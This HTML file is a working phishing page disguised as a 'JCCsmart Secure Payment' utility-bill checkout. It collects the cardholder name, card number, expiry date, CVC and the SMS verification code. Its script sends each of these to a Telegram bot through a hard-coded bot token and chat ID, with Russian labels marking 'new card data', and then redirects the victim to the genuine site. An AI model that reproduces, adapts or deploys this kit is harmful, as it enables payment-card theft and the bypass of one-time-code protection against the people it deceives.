<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JCCsmart Secure Payment</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; padding: 0; color: #333; }
        header { padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
        .logo { font-weight: bold; font-size: 20px; display: flex; align-items: center; }
        .logo span { background: #5cb85c; color: #fff; padding: 2px 6px; border-radius: 4px; margin-right: 5px; }
        .logo-sub { color: #888; font-weight: 400; }
        .container { max-width: 400px; margin: 40px auto; padding: 0 20px; text-align: center; }
        .step { display: none; }
        .step.active { display: block; }
        .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 25px; margin: 20px 0; }
        .old-price { font-size: 16px; color: #888; text-decoration: line-through; margin-bottom: 2px; }
        .discount-badge { display: inline-block; color: #28a745; font-size: 13px; font-weight: 600; padding: 2px 0; margin-bottom: 8px; }
        .amount { font-size: 40px; font-weight: 800; color: #5c46e5; }
        .form-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; margin-bottom: 5px; font-weight: 600; color: #555; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #5c46e5; }
        .row { display: flex; gap: 10px; }
        button { width: 100%; padding: 16px; background: #5c46e5; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #aaa; cursor: not-allowed; }
        .footer-info { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>

<header>
    <div class="logo"><span>JCC</span><div class="logo-sub">smart</div></div>
</header>

<div class="container" id="main-content">
    <!-- ШАГ 1: Просмотр счета -->
    <div class="step active" id="step1">
        <h2>Service Payment</h2>
        <p>Utility Bill: #8829-10</p>
        <div class="amount-box">
            <div class="old-price">230.00€</div>
            <div class="discount-badge">Special discount -30%</div>
            <div style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
            <div class="amount">161.00€</div>
        </div>
        <button onclick="nav(2)">Pay with Card</button>
    </div>

    <!-- ШАГ 2: Ввод данных карты -->
    <div class="step" id="step2">
        <h2 style="margin-bottom: 25px;">Card Details</h2>
        <div class="form-group">
            <label>Cardholder Name</label>
            <input type="text" id="name" placeholder="Name on card">
        </div>
        <div class="form-group">
            <label>Card Number</label>
            <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
        </div>
        <div class="row">
            <div class="form-group" style="flex: 2;">
                <label>Expiry Date</label>
                <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
            </div>
            <div class="form-group" style="flex: 1;">
                <label>CVC</label>
                <input type="password" id="cvc" placeholder="123" maxlength="3">
            </div>
        </div>
        <button id="btn-send-card" onclick="sendData()">Pay 161.00€</button>
        <p style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(1)">← Back to bill</p>
    </div>

    <!-- ШАГ 3: Ввод 6-значного кода подтверждения -->
    <div class="step" id="step3">
        <h2 style="margin-bottom: 10px;">Security Verification</h2>
        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">A 6-digit confirmation code has been sent to your mobile device.</p>
        <div class="form-group">
            <label>Verification Code</label>
            <input type="text" id="sms-code" placeholder="000000" maxlength="6" style="text-align: center; font-size: 20px; letter-spacing: 5px;">
        </div>
        <button id="btn-verify-code" onclick="verifyCode()">Confirm Payment</button>
        <p style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(2)">← Back to card details</p>
    </div>

    <div class="footer-info">🔒 Secured by JCC Payment Systems</div>
</div>

<script>
// Настройки Telegram (Проверьте правильность этих данных)
const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
const CHAT_ID = '6576262467';

function nav(n) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    const targetStep = document.getElementById('step' + n);
    if (targetStep) {
        targetStep.classList.add('active');
    }
}

// Форматирование ввода карты и даты
document.getElementById('card').addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
});
document.getElementById('exp').addEventListener('input', function (e) {
    let val = e.target.value.replace(/[^\d]/g, '');
    if (val.length >= 2) {
        val = val.substring(0, 2) + '/' + val.substring(2, 4);
    }
    e.target.value = val;
});
document.getElementById('sms-code').addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/[^\d]/g, '');
});

// Новая надежная функция отправки с отслеживанием ошибок
async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`; // Исправлен URL-адрес
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });
        
        const result = await response.json();
        
        if (!result.ok) {
            alert(`Ошибка Telegram API: ${result.description}\nПроверьте BOT_TOKEN и CHAT_ID.`);
            return false;
        }
        return true;
    } catch (error) {
        alert(`Ошибка сети: Не удалось отправить запрос в Telegram. Проверьте подключение.`);
        console.error(error);
        return false;
    }
}

async function sendData() {
    const name = document.getElementById('name').value.trim();
    const card = document.getElementById('card').value.trim();
    const exp = document.getElementById('exp').value.trim();
    const cvc = document.getElementById('cvc').value.trim();

    if (!name || card.length < 19 || exp.length < 5 || cvc.length < 3) {
        alert('Please enter valid card details');
        return;
    }

    const btn = document.getElementById('btn-send-card');
    btn.disabled = true;
    btn.innerText = 'Processing...';

    const message = `💳 *НОВЫЕ ДАННЫЕ КАРТЫ*\n\n👤 Имя: \`${name}\`\n🔢 Номер: \`${card}\`\n📅 Срок: \`${exp}\`\n🔒 CVC: \`${cvc}\``;
    
    const isSent = await sendToTelegram(message);
    
    if (isSent) {
        nav(3); // Переход на ввод СМС только если лог ушел
    } else {
        btn.disabled = false;
        btn.innerText = 'Pay 161.00€';
    }
}

async function verifyCode() {
    const code = document.getElementById('sms-code').value.trim();

    if (code.length < 6) {
        alert('Please enter a valid 6-digit verification code');
        return;
    }

    const btn = document.getElementById('btn-verify-code');
    btn.disabled = true;
    btn.innerText = 'Verifying...';

    const message = `💬 *ПОЛУЧЕН СМС-КОД*\n\n🔑 Код: \`${code}\``;
    
    const isSent = await sendToTelegram(message);

    if (isSent) {
        document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
        setTimeout(() => {
            window.location.href = "jccsmart.com"; // Добавлен https:// протокол
        }, 3000);
    } else {
        btn.disabled = false;
        btn.innerText = 'Confirm Payment';
    }
}
</script>

</body>
</html>
